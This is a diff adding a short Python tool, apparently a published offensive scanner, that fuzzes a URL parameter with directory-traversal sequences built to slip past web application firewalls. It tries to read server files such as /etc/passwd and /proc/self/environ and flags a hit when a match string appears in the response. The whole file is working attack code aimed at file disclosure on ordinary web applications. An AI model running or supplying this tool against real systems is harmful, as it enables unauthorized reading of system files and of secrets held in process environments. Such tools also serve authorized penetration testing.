@@ -1,0 +1,73 @@
+#!/usr/bin/env python3
+
+import sys
+import requests
+
+version='0.1'
+def banner() :
+    print("""
+ .--------'                                          
+(_)   /                                  /           
+     /  ).--..-.  )   .-..-.  ).--.. ---/---.    .-. 
+    /  /    (  | (   / ./.-'_/    / \  /     )  /    
+ .-/._/      `-'-'\_/  (__.'/    / ._)/     (_.'     
+(_/  `-     Version: {0}        /         ..-._)      
+
+WAF evading directory traversal scanner by @Wireghoul
+===========================[justanotherhacker.com]===
+""".format(version))
+
+def usage() :
+    print("Usage: traversty URL <file> <match>")
+    print("Example: traversty 'https://some.url/page.php?f=FUZZ' /etc/services IANA")
+    sys.exit(2)
+
+def main() :
+    banner()
+    if (len(sys.argv) == 1 or sys.argv == 3 or len(sys.argv) > 4):
+        usage()
+    if (len(sys.argv) == 4):
+        check(sys.argv[1], sys.argv[2], sys.argv[3])
+        exit()
+    
+    check(sys.argv[1],'/etc/passwd','root:')  #won't work on serenityOS
+
+
+def check(URL, file,match) :
+    for dd in upd:
+        for ss in sep:
+            dir = f"{dd}{dd}{dd}{dd}{dd}{dd}{dd}{dd}{dd}"
+            p=file.split("/")
+            tgt=ss.join(p)
+            URI=URL.replace("FUZZ", f"{dir}{tgt}")
+            print(URI)
+            r = requests.get(URI)
+            if (match in r.text):
+                print("SUCCESS!!! => ", URI)
+                #exit()
+
+# Files:Matchstring
+files = [
+    "/etc/passwd",
+    "/proc/self/environ",
+]
+
+# Dir options
+upd = [
+    "",
+    "/../",
+    "/../.",
+    "/./..",
+    "/.../.",
+    "....//",
+    "/..///",
+]
+
+# File options
+sep = [
+    "/./",
+    "////",
+]
+
+# execute main
+main()
